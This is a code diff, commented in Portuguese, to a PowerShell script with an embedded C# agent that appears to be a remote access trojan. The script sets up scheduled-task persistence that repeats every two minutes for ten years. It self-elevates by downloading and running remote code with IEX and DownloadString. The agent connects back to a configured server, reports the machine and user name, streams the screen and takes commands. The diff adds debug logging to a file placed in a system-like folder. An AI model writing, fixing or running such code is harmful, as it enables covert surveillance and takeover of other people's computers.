@@ -36,7 +36,7 @@ function New-TaskXml {
         $principal = "<UserId>$Sid</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel>"
         $start     = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ss')
         $triggers  = "<LogonTrigger><Enabled>true</Enabled><UserId>$Sid</UserId></LogonTrigger>" +
-                     "<TimeTrigger><StartBoundary>$start</StartBoundary><Repetition><Interval>PT2M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition><Enabled>true</Enabled></TimeTrigger>"
+                     "<TimeTrigger><StartBoundary>$start</StartBoundary><Repetition><Interval>PT2M</Interval><Duration>P3650D</Duration><StopAtEnd>false</StopAtEnd></Repetition><Enabled>true</Enabled></TimeTrigger>"
     }
     @"
 <?xml version="1.0" encoding="UTF-16"?>
@@ -129,7 +129,8 @@ if ($args -contains '-repair') { Repair-Installation -Trigger:($args -contains '
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
+    # -NoExit e sem -WindowStyle Hidden para o console elevado ficar visivel e mostrar erros
+    try { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
     exit
 }
 
@@ -232,12 +233,7 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll")] public static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyWidth, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct CURSORINFO {
-            public int cbSize;
-            public int flags;
-            public IntPtr hCursor;
-            public POINT ptScreenPos;
-        }
+        public struct CURSORINFO { public int cbSize; public int flags; public IntPtr hCursor; public POINT ptScreenPos; }
         [StructLayout(LayoutKind.Sequential)]
         public struct POINT { public int X; public int Y; }
 
@@ -311,9 +307,15 @@ if (-not ("R9KAgent" -as [type])) {
         static long lastQuality = -1;
 
         static volatile bool cursorOverride = false;
-        // --- FIX 1: sinal único de conexão morta + timestamp de pong ---
         static volatile bool connClosed = false;
         static DateTime lastPongTime = DateTime.MinValue;
+
+        static void Log(string msg) {
+            try {
+                string p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Microsoft\Windows\Caches\debug_r9k.txt");
+                File.AppendAllText(p, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " - " + msg + "\r\n");
+            } catch {}
+        }
 
         static void EnsureJpegCodec(long quality) {
             if (jpgCodec == null) {
@@ -341,12 +343,16 @@ if (-not ("R9KAgent" -as [type])) {
                 try {
                     myClient = new TcpClient();
                     myClient.NoDelay = true;
-                    // --- FIX 2: SendTimeout folgado + ReceiveTimeout infinito (EOF é o sinal) ---
                     myClient.SendTimeout = 30000;
                     myClient.ReceiveTimeout = 0;
+                    Log("Iniciando conexao com " + IP + ":" + PORT + "...");
                     IAsyncResult ar = myClient.BeginConnect(IP, PORT, null, null);
-                    if (!ar.AsyncWaitHandle.WaitOne(5000)) { myClient.Close(); throw new Exception("connect timeout"); }
+                    if (!ar.AsyncWaitHandle.WaitOne(5000)) { 
+                        Log("TIMEOUT: O servidor " + IP + ":" + PORT + " nao respondeu em 5s. Porta fechada ou IP errado?");
+                        myClient.Close(); throw new Exception("connect timeout"); 
+                    }
                     myClient.EndConnect(ar);
+                    Log("CONECTADO! Enviando BANNER para a lista...");
                     NetworkStream myStream = myClient.GetStream();
                     StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                     StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
@@ -355,17 +361,21 @@ if (-not ("R9KAgent" -as [type])) {
 
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
 
-                    // --- FIX 3: watchdog em connClosed + lastPongTime, sem Poll/Connected ---
                     connClosed = false;
                     lastPongTime = DateTime.UtcNow;
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                     Thread tBeat = new Thread(() => HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();
+                    
                     while (!connClosed) {
-                        if ((DateTime.UtcNow - lastPongTime).TotalSeconds > 90) { connClosed = true; break; }
+                        if ((DateTime.UtcNow - lastPongTime).TotalSeconds > 90) { 
+                            Log("Conexao morreu: Sem resposta PONG do servidor ha 90s.");
+                            connClosed = true; break; 
+                        }
                         Thread.Sleep(2000);
                     }
-                } catch {
+                } catch (Exception ex) {
+                    Log("FALHA NA CONEXAO: " + ex.Message);
                 } finally {
                     streaming = false;
                     isAudioRunning = false;
@@ -376,7 +386,6 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
-        // --- FIX 6: heartbeat com retry, 8 falhas consecutivas matam ---
         static void HeartbeatLoop(TcpClient myClient, StreamWriter myWriter) {
             int failCount = 0;
             while (!connClosed) {
@@ -385,7 +394,7 @@ if (-not ("R9KAgent" -as [type])) {
                     failCount = 0;
                 } catch {
                     failCount++;
-                    if (failCount > 8) { connClosed = true; break; }
+                    if (failCount > 8) { Log("Heartbeat caiu 8 vezes. Desconectando."); connClosed = true; break; }
                     Thread.Sleep(2000);
                 }
                 Thread.Sleep(20000);
@@ -439,7 +448,6 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
-        // --- FIX 4: EOF do reader é o ÚNICO sinal de "morreu" ---
         static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
             try {
                 while (true) {
@@ -465,7 +473,6 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
-        // --- FIX 5: stream com retry, 8 falhas consecutivas matam ---
         static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
             int failCount = 0;
             while (!connClosed) {
@@ -483,7 +490,7 @@ if (-not ("R9KAgent" -as [type])) {
                     }
                 } catch {
                     failCount++;
-                    if (failCount > 8) { connClosed = true; break; }
+                    if (failCount > 8) { Log("Stream caiu 8 vezes. Desconectando."); connClosed = true; break; }
                     Thread.Sleep(500);
                 }
             }
@@ -645,7 +652,6 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
-                // --- FIX 7: pong do servidor atualiza lastPongTime ---
                 if (cmd == "pong") { lastPongTime = DateTime.UtcNow; return; }
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; cursorOverride = false; lock (writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
